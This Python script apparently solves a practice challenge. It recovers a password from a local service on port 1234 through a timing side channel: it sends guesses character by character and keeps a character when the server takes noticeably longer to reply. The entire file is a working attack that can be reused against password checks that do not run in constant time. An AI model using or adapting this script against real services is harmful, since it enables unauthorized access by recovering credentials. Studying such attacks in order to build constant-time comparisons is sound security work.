__author__ = 'ronza'
import socket as sck

import time

# #create an INET, STREAMing socket
# socket = sck.socket(
#     sck.AF_INET, sck.SOCK_STREAM)
# #now connect to the web server on port 80
# # - the normal http port
# socket.connect(("127.0.0.1", 1234))

string = "Bad password!"
test = ['/'] * 8
# test[0] = 'N'
msg = ''
max_time = 1

while string == "Bad password!":
    s = ''
    a=s.join(test)
    print(a)
    socket = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
    socket.connect(("127.0.0.1", 1234))
    socket.recv(1024)
    time.time()
    s_t = time.time()
    socket.send(a)
    strings = socket.recv(1024)
    e_t = time.time()
    # print(abs(s_t - e_t))
    if test[len(msg)] == '/':
        max_time = abs(s_t - e_t) + 0.05

    if max_time < abs(s_t - e_t):
        msg += test[len(msg)]
    else:
        test[len(msg)] = chr(ord(test[len(msg)]) + 1)
    socket.close()

print(strings)